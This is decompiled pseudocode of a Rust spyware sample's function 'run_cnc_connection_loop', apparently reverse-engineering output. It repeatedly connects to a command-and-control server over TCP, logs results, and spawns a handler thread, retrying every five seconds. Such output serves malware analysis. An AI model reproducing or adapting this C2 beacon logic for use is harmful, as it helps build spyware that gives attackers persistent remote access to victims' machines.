void __noreturn spyware::run_cnc_connection_loop()
{
  __int64 v0; // rax
  __int64 v1; // rax
  unsigned int v2; // [rsp+4h] [rbp-114h] BYREF
  char **v3; // [rsp+8h] [rbp-110h] BYREF
  __int64 v4; // [rsp+10h] [rbp-108h]
  const char **v5; // [rsp+18h] [rbp-100h]
  __int64 v6; // [rsp+20h] [rbp-F8h]
  __int64 v7; // [rsp+28h] [rbp-F0h]
  char v8; // [rsp+30h] [rbp-E8h]
  const char *v9; // [rsp+38h] [rbp-E0h] BYREF
  __int64 (__fastcall *v10)(); // [rsp+40h] [rbp-D8h]
  const char *v11; // [rsp+48h] [rbp-D0h]
  __int64 (__fastcall *v12)(); // [rsp+50h] [rbp-C8h]
  __int64 v13; // [rsp+58h] [rbp-C0h]
  _QWORD v14[2]; // [rsp+60h] [rbp-B8h] BYREF
  _BYTE v15[4]; // [rsp+70h] [rbp-A8h] BYREF
  unsigned int v16; // [rsp+74h] [rbp-A4h]
  __int64 v17; // [rsp+78h] [rbp-A0h]
  _QWORD v18[4]; // [rsp+80h] [rbp-98h] BYREF
  __int128 v19; // [rsp+A0h] [rbp-78h] BYREF
  __int64 v20; // [rsp+B0h] [rbp-68h]
  __int128 v21; // [rsp+B8h] [rbp-60h] BYREF
  __int64 v22; // [rsp+C8h] [rbp-50h]
  _QWORD v23[9]; // [rsp+D0h] [rbp-48h] BYREF

  while ( 1 )
  {
    v9 = (const char *)&off_B93A8;
    v10 = <&T as core::fmt::Display>::fmt;
    v11 = (const char *)&unk_1281A;
    v12 = core::fmt::num::imp::<impl core::fmt::Display for u16>::fmt;
    v3 = (char **)&unk_B9348;
    v4 = 2LL;
    v7 = 0LL;
    v5 = &v9;
    v6 = 2LL;
    core::option::Option<T>::map_or_else(&v21, &v3);
    v19 = v21;
    v20 = v22;
    std::net::tcp::TcpStream::connect(v15, &v19);
    if ( (v15[0] & 1) != 0 )
    {
      v14[0] = v17;
      if ( core::sync::atomic::atomic_load() )
      {
        v23[0] = &v19;
        v18[0] = v23;
        v18[1] = <&T as core::fmt::Display>::fmt;
        v18[2] = v14;
        v18[3] = <std::io::error::Error as core::fmt::Display>::fmt;
        v3 = &off_B9388;
        v4 = 2LL;
        v7 = 0LL;
        v5 = (const char **)v18;
        v6 = 2LL;
        v0 = log::__private_api::loc(&off_B9400);
        v9 = aSpyware;
        v10 = (__int64 (__fastcall *)())&byte_7;
        v11 = aSpyware;
        v12 = (__int64 (__fastcall *)())&byte_7;
        v13 = v0;
        log::__private_api::log(&v3, 1LL, &v9);
      }
      core::ptr::drop_in_place<std::io::error::Error>(v14);
    }
    else
    {
      v2 = v16;
      if ( (unsigned __int64)core::sync::atomic::atomic_load() >= 3 )
      {
        std::net::tcp::TcpStream::peer_addr(&v3, &v2);
        core::result::Result<T,E>::unwrap(v18, &v3);
        <T as alloc::string::SpecToString>::spec_to_string(v23, v18);
        v14[0] = v23;
        v14[1] = <alloc::string::String as core::fmt::Display>::fmt;
        v3 = &off_B9368;
        v4 = 2LL;
        v7 = 0LL;
        v5 = (const char **)v14;
        v6 = 1LL;
        v1 = log::__private_api::loc(&off_B93D0);
        v9 = aSpyware;
        v10 = (__int64 (__fastcall *)())&byte_7;
        v11 = aSpyware;
        v12 = (__int64 (__fastcall *)())&byte_7;
        v13 = v1;
        log::__private_api::log(&v3, 3LL, &v9);
        core::ptr::drop_in_place<alloc::string::String>(v23);
      }
      v5 = (const char **)0x8000000000000000LL;
      v3 = 0LL;
      v8 = 0;
      std::thread::Builder::spawn_unchecked(&v9, &v3, v2);
      core::result::Result<T,E>::expect(&v3, &v9);
      core::ptr::drop_in_place<std::thread::JoinHandle<core::result::Result<(),std::io::error::Error>>>(&v3);
    }
    std::thread::sleep(5LL, 0LL);
    core::ptr::drop_in_place<alloc::string::String>(&v19);
  }
}